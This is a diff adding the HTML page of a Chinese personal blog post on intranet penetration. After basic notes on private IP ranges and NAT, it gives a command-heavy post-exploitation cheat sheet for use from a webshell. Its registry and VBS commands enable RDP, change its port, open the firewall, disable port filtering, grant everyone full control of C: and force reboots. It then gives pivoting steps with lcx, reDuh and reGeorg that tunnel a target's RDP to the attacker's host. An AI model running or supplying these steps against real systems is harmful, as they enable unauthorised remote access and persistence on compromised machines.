@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="future.zhangyan">
+
+
+
+    <meta name="description" content="未来可期">
+
+
+
+<title>内网渗透 | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+	<!--动态线条背景-->
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+<body>
+    <div class="wrapper">
+        <header>
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons"
+      rel="stylesheet">
+	  <script type="text/javascript" src="C:/Users/zhangyan/Desktop/blog/themes/next/source/js"></script>
+
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">张艳&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/book">Book</a>
+                
+                    <a class="menu-item" href="/bangumis">Bangumis</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+				<label for="switch_default" class="toggleBtn"></label>
+         
+				<div class="search bar7">
+					<form id="search-form"> <!-- 搜索框相关 -->
+						<input type="text" id="local-search-input" name="q" results="0" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off"/>
+						<button type="submit" class="search-form-submit"></button>
+						<i class="fa fa-times" onclick="resetSearch()"></i> <!-- 清空/重置搜索框 -->
+					</form>
+					<div class="ins-section-wrapper">
+						<div class="ins-section-container"></div>
+					</div>
+					<div id="local-search-result"></div> <!-- 搜索结果区 -->
+						<p class='no-result'>No results found </p> <!-- 无匹配时显示，注意请在 CSS 中设置默认隐藏 -->
+					</div>
+
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">张艳&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/book">Book</a>
+                
+                    <a class="menu-item" href="/bangumis">Bangumis</a>
+                
+            </div>
+
+
+        </div>
+    </nav>
+
+</header>
+<style type="text/css">
+	* {
+		box-sizing:border-box;
+	}
+	body {
+		margin:0;
+		padding:0;
+		background-image:url(ydrzimages/p3.jpg);
+		font-weight:500;
+		font-family:"Microsoft YaHei","宋体","Segoe UI","Lucida Grande",Helvetica,Arial,sans-serif,FreeSans,Arimo;
+	}
+	#container {
+		width:500px;
+		height:820px;
+		margin:0 auto;
+	}
+	div.search {
+		padding:10px 0;
+		margin-left:200px
+	}
+	form {
+		position:relative;
+		width:300px;
+		margin:0 auto;
+	}
+	input,button {
+		border:none;
+		outline:none;
+	}
+	input {
+		width:100%;
+		height:42px;
+		padding-left:13px;
+	}
+	button {
+		height:42px;
+		width:42px;
+		cursor:pointer;
+		position:absolute;
+	}
+	/*搜索框7*/
+		  
+	.bar7 form {
+		height:42px;
+	}
+	.bar7 input {
+		width:200px;
+		border-radius:42px;
+		border:2px solid #324B4E;
+		transition:.3s linear;
+		float:right;
+	}
+	.bar7 input:focus {
+		width:300px;
+	}
+	.bar7 button {
+		background:none;
+		top:-2px;
+		right:20px;
+	}
+	.bar7 button:before {
+		content:"点..";
+		font-family:FontAwesome;
+		color:#324b4e;
+	}
+	.no-result{
+		display:none
+	}
+</style>
+
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">内网渗透</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">future.zhangyan</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">August 16, 2020&nbsp;&nbsp;23:06:21</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                            
+                        </span>
+						<span id="/2020/08/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="leancloud-visitors view" data-flag-title="内网渗透">
+						  <em class="post-meta-item-text">Pageviews:</em>
+						  <i class="leancloud-visitors-count"></i>
+						</span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.png"></p>
+<h2 id="内网概述"><a href="#内网概述" class="headerlink" title="内网概述"></a>内网概述</h2><p>内网IP是以下面几个段bai开头的IP.用户可以自己设置du.常用的zhi内网IP地址:</p>
+<ul>
+<li>10.x.x.x</li>
+<li>172.16.x.x至172.31.x.x</li>
+<li>192.168.x.x</li>
+</ul>
+<p>　内网的计算机以<strong>NAT</strong>（网络地址转换）协议，通过一个公共的网关访问Internet。内网的计算机可向Internet上的其他计算机发送连接请求，但Internet上其他的计算机无法向内网的计算机发送连接请求。</p>
+<p>　NAT（Network Address Translator）是网络地址转换，它实现内网的IP地址与公网的地址之间的相互转换，将大量的内网IP地址转换为一个或少量的公网IP地址，减少对公网IP地址的占用。NAT的最典型应用是：在一个局域网内，只需要一台计算机连接上Internet，就可以利用NAT共享Internet连接，使局域网内其他计算机也可以上网。使用NAT协议，局域网内的计算机可以访问Internet上的计算机，但Internet上的计算机无法访问局域网内的计算机。</p>
+<p>　Windows操作系统的Internet连接共享、sygate、winroute、unix/linux的natd等软件，都是使用NAT协议来共享Internet连接。　　</p>
+<p>    所有ISP（Internet服务提供商）提供的内网Internet接入方式，几乎都是基于NAT协议的。</p>
+<h3 id="内网IP-详细"><a href="#内网IP-详细" class="headerlink" title="内网IP 详细:"></a><strong>内网IP 详细</strong>:</h3><p>大部分网络使用B类或C类地址，每一个类的第一个八位组的范围如下：</p>
+<h4 id="1、-0-—127。"><a href="#1、-0-—127。" class="headerlink" title="1、 0-—127。"></a>1、 0-—127。</h4><p>A类 网络号码范围是 0.0.0.0—127.0.0.0 ,用于128个网络。但网络不能全由0组成且127.0.0.0保留用于回路。剩下的126个网络，1到126，共有16777214个可能的主机地址（16777216减2）</p>
+<p>A类 网络 —主机—主机—主机</p>
+<p>0-127 127 0 0 0</p>
+<h4 id="2、-128—191。"><a href="#2、-128—191。" class="headerlink" title="2、 128—191。"></a>2、 128—191。</h4><p>B类，网络号码范围是128.0.0.0–191.254.0.0 用于16256个网络。共有65534个可能的主机地址</p>
+<p>B类 网络—网络—-主机—主机</p>
+<p>128-191 128 123 0 0</p>
+<h4 id="3、-192–223。"><a href="#3、-192–223。" class="headerlink" title="3、 192–223。"></a>3、 192–223。</h4><p>C类，网络号码范围是192.0.0.0–223.254.254.0，用于2064512个网络。共有254个可能的主机地址</p>
+<p>C类 网络—网络—-网络—主机</p>
+<p>192-223 192 0 0 0</p>
+<p>所有的网络空间计算都必须“减2”，这是因为要扣除两个保留地址：“0”为网络号，“255”为广播。地址1-254分配给主机。</p>
+<p>第一个八位组号码224-254保留给在这儿未讨论的特殊类（组播和实验）。</p>
+<p>通过上述讨论，可以知道只有很少数非常大的组织才能拥有A类地址，实际上只有126个这样的组织，我们中大多数用的是B类和C类IP地址与INTERNET相连。</p>
+<h2 id="🎃一、通过webshell开启3389"><a href="#🎃一、通过webshell开启3389" class="headerlink" title="🎃一、通过webshell开启3389"></a>🎃一、通过webshell开启3389</h2><p>1.查询终端端口</p>
+<h2 id="xp-amp-2003：REG-query-HKLM-SYSTEM-CurrentControlSet-Control-Terminal”-“Server-WinStations-RDP-Tcp-v-PortNumber"><a href="#xp-amp-2003：REG-query-HKLM-SYSTEM-CurrentControlSet-Control-Terminal”-“Server-WinStations-RDP-Tcp-v-PortNumber" class="headerlink" title="xp&amp;2003：REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server\WinStations\RDP-Tcp /v PortNumber"></a>xp&amp;2003：REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server\WinStations\RDP-Tcp /v PortNumber</h2><p>通用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regedit &#x2F;e tsp.reg &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal server\Wds\rdpwd\Tds\tcp&quot;</span><br><span class="line">type tsp.reg</span><br></pre></td></tr></table></figure>
+
+<p>2.开启XP&amp;2003终端服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure>
+
+<p>3.更改终端端口为20008(0x4E28)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\Wds\rdpwd\Tds\tcp &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x4E28 &#x2F;f</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x4E28 &#x2F;f</span><br></pre></td></tr></table></figure>
+
+<p>4.取消xp&amp;2003系统防火墙对终端服务3389端口的限制及IP连接的限制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List &#x2F;v 3389:TCP &#x2F;t REG_SZ &#x2F;d 3389:TCP:*:Enabled:@xpsp2res.dll,-22009 &#x2F;f</span><br></pre></td></tr></table></figure>
+
+<p>5.开启Win2000的终端，端口为3389(需重启)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">echo Windows Registry Editor Version 5.00 &gt;2000.reg</span><br><span class="line">echo. &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\netcache] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;Enabled&quot;&#x3D;&quot;0&quot; &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;ShutdownWithoutLogon&quot;&#x3D;&quot;0&quot; &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;EnableAdminTSRemote&quot;&#x3D;dword:00000001 &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;TSEnabled&quot;&#x3D;dword:00000001 &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermDD] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;Start&quot;&#x3D;dword:00000002 &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;Start&quot;&#x3D;dword:00000002 &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_USERS\.DEFAULT\Keyboard Layout\Toggle] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;Hotkey&quot;&#x3D;&quot;1&quot; &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;PortNumber&quot;&#x3D;dword:00000D3D &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;PortNumber&quot;&#x3D;dword:00000D3D &gt;&gt;2000.reg</span><br></pre></td></tr></table></figure>
+
+<p>6.强行重启Win2000&amp;Win2003系统(执行完最后一条一句后自动重启)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@ECHO OFF &amp; cd&#x2F;d %temp% &amp; echo [version] &gt; restart.inf</span><br><span class="line">(set inf&#x3D;InstallHinfSection DefaultInstall)</span><br><span class="line">echo signature&#x3D;$chicago$ &gt;&gt; restart.inf</span><br><span class="line">echo [defaultinstall] &gt;&gt; restart.inf</span><br><span class="line">rundll32 setupapi,%inf% 1 %temp%\restart.inf</span><br></pre></td></tr></table></figure>
+
+<p>7.禁用TCP/IP端口筛选 (需重启)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\ControlSet001\Services\Tcpip\parameters &#x2F;v EnableSecurityFilters &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure>
+
+<p>8.终端超出最大连接数时可用下面的命令来连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mstsc &#x2F;v:ip:3389 &#x2F;console</span><br></pre></td></tr></table></figure>
+
+<p>9.调整NTFS分区权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">cacls c: &#x2F;e &#x2F;t &#x2F;g everyone:F (所有人对c盘都有一切权利)</span><br><span class="line"></span><br><span class="line">cacls %systemroot%\system32\*.exe &#x2F;d everyone (拒绝所有人访问system32中exe文件)</span><br><span class="line"></span><br><span class="line">------------------------------------------------------</span><br><span class="line">3389.vbs cscript.exe</span><br><span class="line">------------------------------------------------------</span><br><span class="line"></span><br><span class="line">On Error Resume Next</span><br><span class="line">const HKEY_LOCAL_MACHINE &#x3D; &amp;H80000002</span><br><span class="line">strComputer &#x3D; &quot;.&quot;</span><br><span class="line">Set StdOut &#x3D; WScript.StdOut</span><br><span class="line">Set oReg&#x3D;GetObject(&quot;winmgmts:&#123;impersonationLevel&#x3D;impersonate&#125;!\\&quot; &amp;_</span><br><span class="line">strComputer &amp; &quot;\root\default:StdRegProv&quot;)</span><br><span class="line">strKeyPath &#x3D; &quot;SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span><br><span class="line">oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath</span><br><span class="line">strKeyPath &#x3D; &quot;SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp&quot;</span><br><span class="line">oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath</span><br><span class="line">strKeyPath &#x3D; &quot;SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span><br><span class="line">strKeyPath &#x3D; &quot;SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span><br><span class="line">strValueName &#x3D; &quot;fDenyTSConnections&quot;</span><br><span class="line">dwValue &#x3D; 0</span><br><span class="line">oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValue</span><br><span class="line">strKeyPath &#x3D; &quot;SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp&quot;</span><br><span class="line">strValueName &#x3D; &quot;PortNumber&quot;</span><br><span class="line">dwValue &#x3D; 3389</span><br><span class="line">oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValue</span><br><span class="line">strKeyPath &#x3D; &quot;SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span><br><span class="line">strValueName &#x3D; &quot;PortNumber&quot;</span><br><span class="line">dwValue &#x3D; 3389</span><br><span class="line">oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValue</span><br><span class="line">Set R &#x3D; CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">R.run(&quot;Shutdown.exe -r -t 0&quot;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="通过3389工具开启远程终端"><a href="#通过3389工具开启远程终端" class="headerlink" title="通过3389工具开启远程终端"></a>通过3389工具开启远程终端</h3><h2 id="服务器端口被修改如何查找"><a href="#服务器端口被修改如何查找" class="headerlink" title="服务器端口被修改如何查找"></a>服务器端口被修改如何查找</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目前主要通过注册表读取、端口扫描、命令探针等三种方法查找修改后的端口</span><br></pre></td></tr></table></figure>
+
+<h2 id="服务器处于内网如何远程连接"><a href="#服务器处于内网如何远程连接" class="headerlink" title="服务器处于内网如何远程连接"></a>服务器处于内网如何远程连接</h2><h3 id="1、拥有公网ip的条件下"><a href="#1、拥有公网ip的条件下" class="headerlink" title="1、拥有公网ip的条件下"></a>1、拥有公网ip的条件下</h3><p>1、通过lcx工具解决内网远程连接<br>上传一个cmd.exe文件和lck工具然后setp cmd.exe设置终端路径解决运行权限问题。</p>
+<blockquote>
+<p>Webshell上执行：lcx.exe -slave 自己的公网ip 2222 127.0.0.1 3389 （将本机3389端口流量转发到公网ip的2222端口上去）</p>
+</blockquote>
+<blockquote>
+<p>自己的电脑里面执行：lcx.exe -listen 2222 4444 （监听本地的2222端口将流量转发到4444 ）</p>
+</blockquote>
+<h3 id="2、没有公网ip的情况下"><a href="#2、没有公网ip的情况下" class="headerlink" title="2、没有公网ip的情况下"></a>2、没有公网ip的情况下</h3><h4 id="通过端口转发脚本解决内网远程连接"><a href="#通过端口转发脚本解决内网远程连接" class="headerlink" title="通过端口转发脚本解决内网远程连接"></a>通过端口转发脚本解决内网远程连接</h4><blockquote>
+<p>只能通过内网的web进行连接<br>使用reDuhGUI_0.1工具利用菜刀将reDuh.php脚本上传到靶机。然后双击物理机的reDuhGUI.exe运行脚本<br>如果有安全狗会被拦截</p>
+</blockquote>
+<h2 id="内网渗透（内到内到内渗透）"><a href="#内网渗透（内到内到内渗透）" class="headerlink" title="内网渗透（内到内到内渗透）"></a>内网渗透（内到内到内渗透）</h2><p>内网渗透使用这两个工具–reGeorg+Proxifier<br>首先进入regeorg文件将tunnel.nosocket.php上传到靶机web根目录本地python运行 pip install urllib3环境下执行cmd<br>reGeorg-master[reGeorgSocksProxy.py](<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://reGeorgSocksProxy.py">https://links.jianshu.com/go?to=http%3A%2F%2FreGeorgSocksProxy.py</a>) -p  9999 -u <a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://192.168.60.118:8080/tunnel.nosocket.php">http://192.168.60.118:8080/tunnel.nosocket.php</a></p>
+<p><img src="/image/%E5%86%85%E7%BD%91.jpg"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>future.zhangyan</span>
+                    </p>
+                
+				
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://zhangyanlady.github.io/2020/08/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">https://zhangyanlady.github.io/2020/08/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>The future can be expected, the world is worth it.</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"># 网络安全</a>
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/09/10/WhatWeb%E4%BD%BF%E7%94%A8/">WhatWeb使用</a>
+            
+            
+            <a class="next" rel="next" href="/2020/07/23/%E6%97%81%E6%B3%A8%E3%80%81%E7%9B%AE%E5%BD%95%E8%B6%8A%E6%9D%83%E3%80%81%E8%B7%A8%E5%BA%93%E3%80%81CDN%E7%BB%95%E8%BF%87/">旁注、目录越权、跨库、CDN绕过</a>
+            
+        </section>
+			</br>
+			
+
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© future.zhangyan | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+	<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+    </div>
+
+
+	
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
